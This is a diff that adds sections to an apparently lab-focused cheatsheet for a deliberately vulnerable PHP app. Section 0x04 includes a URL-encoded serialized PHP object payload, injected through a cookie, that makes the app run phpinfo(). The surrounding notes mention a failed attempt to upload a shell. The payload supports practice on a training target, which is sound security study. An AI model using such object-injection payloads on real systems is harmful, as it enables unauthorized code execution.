@@ -52,3 +52,15 @@ access `http://localhost:3001/index.html` from browser.
 <img src="https://github.com/fujiokayu/lkwa-cheatsheet/blob/master/evidence/0x02.png" width="200">
 
 ## 0x03 – PHP Object Injection
+
+skip.  
+I coudn't upload a shell.
+
+## 0x04 – PHP Object Injection(cookie)
+
+change cookie and inject php object as follows:  
+O%3A3%3A%22Foo%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%0D%0A
+
+## 0x05 – PHP Object Injection(Object Reference)
+
+
